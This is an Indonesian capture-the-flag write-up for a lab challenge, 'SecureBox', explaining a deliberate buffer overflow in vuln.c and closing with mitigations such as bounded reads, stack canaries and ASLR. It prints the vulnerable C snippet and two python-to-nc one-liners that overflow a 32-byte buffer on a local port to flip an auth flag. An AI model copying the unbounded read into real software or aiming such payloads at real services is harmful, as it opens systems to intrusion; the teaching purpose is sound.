# WRITEUP · 08 SecureBox (SPOILER)

## 1. Pahami bug (source review)

Di `vuln.c`:

```c
struct { char buf[32]; volatile int authed; } s;
s.authed = 0;
read(0, s.buf, 128);        // membaca sampai 128 byte ke buf yang cuma 32 byte
if (s.authed != 0) win();   // win() mencetak flag
```

`buf` berukuran 32 byte, tapi `read()` menerima sampai 128. Dalam struct, `authed`
berada tepat setelah `buf` (offset 32). Menulis lebih dari 32 byte akan menimpa
`authed`. Jika nilainya jadi bukan-nol, pengecekan lolos dan `win()` dipanggil.

## 2. Eksploitasi

Kirim 32 byte padding + minimal 1 byte bukan-nol:

```bash
# paling sederhana:
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*36)' | nc -q1 127.0.0.1 9008

# atau eksplisit set authed = 1:
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*32 + struct.pack("<i",1))' | nc -q1 127.0.0.1 9008
```

Output:

```
Autentikasi berhasil!
Akses diberikan! FLAG{...}
```

(Di docker gunakan port `8008`.)

## 3. Kenapa offset-nya tepat 32?

`buf` di awal struct (offset 0), `authed` int 4-byte tepat sesudahnya (offset 32).
Karena memakai `struct`, tata letaknya pasti — tidak tergantung urutan variabel
yang dipilih compiler. Itu sebabnya eksploit ini deterministik.

> Catatan arsitektur: di ARM64 (NetHunter), menimpa **alamat kembali** (ret2win)
> lebih rumit karena saved LR berada di bawah buffer dan ada syarat alignment SP.
> Menimpa **variabel bersebelahan** seperti ini jauh lebih andal untuk belajar
> konsep stack overflow, dan jalan sama persis di ARM64 maupun x86-64.

## 4. Pelajaran & mitigasi

- **Jangan membaca melebihi ukuran buffer.** Pakai batas yang benar:
  `read(0, buf, sizeof(buf))`.
- Aktifkan **stack canary** (`-fstack-protector-strong`), **ASLR/PIE**, dan
  **NX** — kompilasi tadi sengaja mematikannya untuk belajar.
- Hindari fungsi tak aman (`gets`, `strcpy`, `sprintf`); pakai varian ber-batas
  (`fgets`, `strncpy`, `snprintf`).
